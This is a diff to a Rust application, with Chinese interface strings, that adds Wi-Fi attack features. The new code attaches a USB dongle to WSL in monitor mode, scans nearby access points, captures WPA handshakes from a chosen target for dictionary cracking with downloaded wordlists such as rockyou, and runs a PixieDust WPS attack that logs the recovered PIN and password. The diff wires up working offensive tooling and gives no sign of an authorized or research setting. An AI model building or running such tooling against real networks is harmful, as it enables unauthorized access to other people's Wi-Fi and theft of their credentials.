@@ -20,15 +20,20 @@ use crate::config::{self, Config};
 use crate::events;
 use crate::netsh::{self, InterfaceState, NetworkInfo};
 use crate::pipeline::PipelineSummary;
+use crate::wslattack::{self, AdapterMode, Ap, PixieOut};
 
 pub struct AppState {
     pub cfg: Mutex<Config>,
-    pub config_path: PathBuf,
+    pub config_path: std::path::PathBuf,
     pub busy: Mutex<Option<String>>,
     pub task_started: AtomicBool,
     pub networks: Mutex<Option<Vec<NetworkInfo>>>,
     pub iface: Mutex<Option<InterfaceState>>,
     pub summary: Mutex<Option<PipelineSummary>>,
+    pub wsl_iface: Mutex<Option<String>>,
+    pub wsl_adapter: Mutex<String>,
+    pub wsl_aps: Mutex<Vec<Ap>>,
+    pub pixie_out: Mutex<Vec<PixieOut>>,
 }
 
 impl AppState {
@@ -43,6 +48,10 @@ impl AppState {
             networks: Mutex::new(None),
             iface: Mutex::new(None),
             summary: Mutex::new(None),
+            wsl_iface: Mutex::new(None),
+            wsl_adapter: Mutex::new("未检测".into()),
+            wsl_aps: Mutex::new(Vec::new()),
+            pixie_out: Mutex::new(Vec::new()),
         }
     }
 
@@ -97,6 +106,15 @@ async fn api_networks(State(st): State<Arc<AppState>>) -> Json<serde_json::Value
     Json(json!({ "networks": nets }))
 }
 
+async fn api_wsl(State(st): State<Arc<AppState>>) -> Json<serde_json::Value> {
+    Json(json!({
+        "adapter": st.wsl_adapter.lock().unwrap().clone(),
+        "iface": st.wsl_iface.lock().unwrap().clone(),
+        "aps": st.wsl_aps.lock().unwrap().clone(),
+        "pixie": st.pixie_out.lock().unwrap().clone(),
+    }))
+}
+
 #[derive(Deserialize)]
 struct EventsQuery {
     since: Option<u64>,
@@ -122,6 +140,9 @@ async fn api_config_post(
 #[derive(Deserialize)]
 struct TaskReq {
     task: String,
+    bssid: Option<String>,
+    ch: Option<String>,
+    essid: Option<String>,
 }
 
 async fn api_task(
@@ -138,6 +159,22 @@ async fn api_task(
         "full" => AppState::spawn_task(&st, "全流程", |s| task_full(s)),
         "dict_xato" => AppState::spawn_task(&st, "下载top100万", |s| task_dict(s, false)),
         "dict_rockyou" => AppState::spawn_task(&st, "下载rockyou", |s| task_dict(s, true)),
+        "wsl_attach" => AppState::spawn_task(&st, "WSL接入网卡", |s| task_wsl_attach(s)),
+        "wsl_scan" => AppState::spawn_task(&st, "WSL扫描", |s| task_wsl_scan(s)),
+        "wsl_capture" => {
+            let (b, c, e) = match (req.bssid.clone(), req.ch.clone(), req.essid.clone()) {
+                (Some(b), Some(c), Some(e)) => (b, c, e),
+                _ => return Err((StatusCode::BAD_REQUEST, "需要 bssid/ch/essid".into())),
+            };
+            AppState::spawn_task(&st, "WSL定向抓包", move |s| task_wsl_capture(s, b, c, e))
+        }
+        "wsl_pixie" => {
+            let (b, e) = match (req.bssid.clone(), req.essid.clone()) {
+                (Some(b), Some(e)) => (b, e),
+                _ => return Err((StatusCode::BAD_REQUEST, "需要 bssid/essid".into())),
+            };
+            AppState::spawn_task(&st, "WSL PixieDust", move |s| task_wsl_pixie(s, b, e))
+        }
         other => {
             return Err((StatusCode::BAD_REQUEST, format!("unknown task: {}", other)));
         }
@@ -294,6 +331,188 @@ fn task_dict(st: Arc<AppState>, rockyou: bool) {
     }
 }
 
+// ── WSL hardware tasks ──────────────────────────────────────────────────────
+
+fn wsl_adapter_summary() -> String {
+    match wslattack::adapter() {
+        None => "未检测到（请插入网卡）".into(),
+        Some(a) => {
+            let mode = match a.mode {
+                AdapterMode::Msc => "U盘模式(需切换)",
+                AdapterMode::Wlan => "WiFi模式",
+            };
+            let state = if a.attached {
+                "已接入WSL"
+            } else if a.shared {
+                "已共享"
+            } else {
+                "未共享"
+            };
+            format!("{} [{}|{}]", a.busid, mode, state)
+        }
+    }
+}
+
+fn task_wsl_attach(st: Arc<AppState>) {
+    *st.wsl_adapter.lock().unwrap() = wsl_adapter_summary();
+    let Some(info) = wslattack::adapter() else {
+        events::global().push("未检测到 AIC 网卡 — 请插入 Tenda U2");
+        return;
+    };
+    let distro = st.cfg.lock().unwrap().wsl.distro.clone();
+
+    // MSC mode: eject the fake CD on the WINDOWS side (avoids the
+    // "device used by Windows" attach refusal); device re-enumerates as WLAN.
+    if info.mode == AdapterMode::Msc {
+        events::global().push("U盘模式：在 Windows 侧弹出伪U盘…");
+        if let Err(e) = wslattack::windows_eject_msc() {
+            events::global().push(format!("弹出失败: {e:#}"));
+        }
+        for _ in 0..8 {
+            std::thread::sleep(std::time::Duration::from_secs(2));
+            match wslattack::adapter() {
+                Some(a) if a.mode == AdapterMode::Wlan => break,
+                _ => {}
+            }
+        }
+    }
+
+    // WLAN mode: attach to WSL (auto-elevate if bind lost)
+    let Some(info) = wslattack::adapter() else {
+        events::global().push("未找到网卡（检查 Windows 设备管理器）");
+        return;
+    };
+    if info.mode == AdapterMode::Wlan && !info.attached {
+        events::global().push(format!("接入 WSL: {}（未共享时会弹 UAC）", info.busid));
+        if let Err(e) = wslattack::attach(&info) {
+            events::global().push(format!("接入失败: {e:#}"));
+            return;
+        }
+    }
+
+    std::thread::sleep(std::time::Duration::from_secs(2));
+    // Stale-attach recovery: Windows may say "Attached" but the device is not
+    // in the (restarted) WSL VM — detach and re-attach.
+    if !wslattack::has_device(&distro) {
+        events::global().push("WSL 内未看到设备 — 清除陈旧接入后重试…");
+        if let Some(a) = wslattack::adapter() {
+            wslattack::detach(&a.busid);
+            std::thread::sleep(std::time::Duration::from_secs(2));
+            // detach may power-cycle the dongle back to MSC mode — eject again
+            let _ = wslattack::windows_eject_msc();
+            std::thread::sleep(std::time::Duration::from_secs(3));
+            let _ = std::process::Command::new(wslattack::USBIPD)
+                .args(["attach", "--wsl", "--busid", &a.busid])
+                .output();
+            std::thread::sleep(std::time::Duration::from_secs(4));
+        }
+        std::thread::sleep(std::time::Duration::from_secs(3));
+    }
+    // No udev coldplug in WSL — load the driver explicitly.
+    if let Err(e) = wslattack::load_driver(&distro) {
+        events::global().push(format!("驱动加载失败: {e:#}"));
+        return;
+    }
+    std::thread::sleep(std::time::Duration::from_secs(2));
+    let Some(iface) = wslattack::find_iface(&distro) else {
+        events::global().push("WSL 内未发现 wlan 接口 — 检查 lsusb / 驱动");
+        *st.wsl_adapter.lock().unwrap() = wsl_adapter_summary();
+        return;
+    };
+    match wslattack::up_monitor(&distro, &iface) {
+        Ok(()) => {
+            *st.wsl_iface.lock().unwrap() = Some(iface.clone());
+            *st.wsl_adapter.lock().unwrap() = wsl_adapter_summary();
+            events::global().push(format!("网卡就绪：{iface} 已进监听模式"));
+        }
+        Err(e) => events::global().push(format!("监听模式失败: {e:#}")),
+    }
+}
+
+fn task_wsl_scan(st: Arc<AppState>) {
+    let distro = st.cfg.lock().unwrap().wsl.distro.clone();
+    let Some(iface) = st.wsl_iface.lock().unwrap().clone() else {
+        events::global().push("先执行「接入网卡」");
+        return;
+    };
+    match wslattack::scan_aps(&distro, &iface) {
+        Ok(aps) => {
+            let n = aps.len();
+            events::global().push(format!("WSL 扫描完成：{} 个 AP（按信号排序）", n));
+            for a in aps.iter().take(15) {
+                events::global().push(format!(
+                    "  {:18} {} dBm ch{} {}",
+                    if a.essid.len() > 18 { &a.essid[..18] } else { &a.essid },
+                    a.power,
+                    a.channel,
+                    a.bssid
+                ));
+            }
+            *st.wsl_aps.lock().unwrap() = aps;
+        }
+        Err(e) => events::global().push(format!("WSL 扫描失败: {e:#}")),
+    }
+}
+
+fn task_wsl_capture(st: Arc<AppState>, bssid: String, ch: String, essid: String) {
+    let distro = st.cfg.lock().unwrap().wsl.distro.clone();
+    let sec = st.cfg.lock().unwrap().capture.duration_sec;
+    let Some(iface) = st.wsl_iface.lock().unwrap().clone() else {
+        events::global().push("先执行「接入网卡」");
+        return;
+    };
+    let logs_dir = config::ensure_logs_dir();
+    let caps_abs = std::fs::canonicalize(logs_dir.join("caps")).unwrap_or_else(|_| std::path::PathBuf::from("logs/caps"));
+    // strip the \\?\ canonical prefix and map X:\... -> /mnt/x/... for Linux
+    let caps_win = caps_abs
+        .to_string_lossy()
+        .trim_start_matches(std::path::MAIN_SEPARATOR)
+        .trim_start_matches("?")
+        .trim_start_matches(std::path::MAIN_SEPARATOR)
+        .to_string();
+    let caps_str = if caps_win.as_bytes().get(1) == Some(&b':') {
+        format!("/mnt/{}{}", (caps_win.as_bytes()[0] as char).to_lowercase(), &caps_win[2..])
+    } else {
+        caps_win.clone()
+    };
+    events::global().push(format!("定向抓包 {essid} ({bssid} ch{ch}) {sec}s — 等待目标客户端产生握手…"));
+    match wslattack::capture(&distro, &iface, &bssid, &ch, &essid, sec, &caps_str) {
+        Ok(file) => events::global().push(format!("抓包完成 -> {file}（可用「爆破」跑字典）")),
+        Err(e) => events::global().push(format!("抓包失败: {e:#}")),
+    }
+}
+
+fn task_wsl_pixie(st: Arc<AppState>, bssid: String, essid: String) {
+    let (distro, tmo) = {
+        let c = st.cfg.lock().unwrap();
+        (c.wsl.distro.clone(), c.wsl.pixie_timeout_sec)
+    };
+    let Some(iface) = st.wsl_iface.lock().unwrap().clone() else {
+        events::global().push("先执行「接入网卡」");
+        return;
+    };
+    events::global().push(format!("PixieDust 攻击 {essid} ({bssid})，超时 {tmo}s…"));
+    match wslattack::pixie(&distro, &iface, &bssid, tmo) {
+        Ok(p) => {
+            let hit = p.pin.is_some();
+            events::global().push(if hit {
+                format!(
+                    "*** PixieDust 命中 {} PIN={} PSK={} ***",
+                    bssid,
+                    p.pin.as_deref().unwrap_or("?"),
+                    p.psk.as_deref().unwrap_or("(无)")
+                )
+            } else {
+                format!("PixieDust 未命中 {bssid}（固件不易感或目标无 WPS）")
+            });
+            let mut all = st.pixie_out.lock().unwrap();
+            all.retain(|x| x.bssid != p.bssid);
+            all.push(p);
+        }
+        Err(e) => events::global().push(format!("PixieDust 失败: {e:#}")),
+    }
+}
+
 // ── server + window ─────────────────────────────────────────────────────────
 
 fn build_router(state: Arc<AppState>) -> Router {
@@ -301,6 +520,7 @@ fn build_router(state: Arc<AppState>) -> Router {
         .route("/", get(index))
         .route("/api/state", get(api_state))
         .route("/api/networks", get(api_networks))
+        .route("/api/wsl", get(api_wsl))
         .route("/api/events", get(api_events))
         .route("/api/config", post(api_config_post))
         .route("/api/task", post(api_task))
@@ -335,7 +555,7 @@ pub fn start(cfg: Config) -> Result<()> {
     let logs_dir = config::ensure_logs_dir();
     let _ = std::fs::create_dir_all(&logs_dir);
 
-    // periodic connection-status refresh
+    // periodic connection-status + adapter refresh
     {
         let st = state.clone();
         std::thread::spawn(move || loop {
@@ -343,6 +563,7 @@ pub fn start(cfg: Config) -> Result<()> {
                 if let Ok(i) = netsh::show_interface() {
                     *st.iface.lock().unwrap() = Some(i);
                 }
+                *st.wsl_adapter.lock().unwrap() = wsl_adapter_summary();
             }
             std::thread::sleep(Duration::from_secs(10));
         });
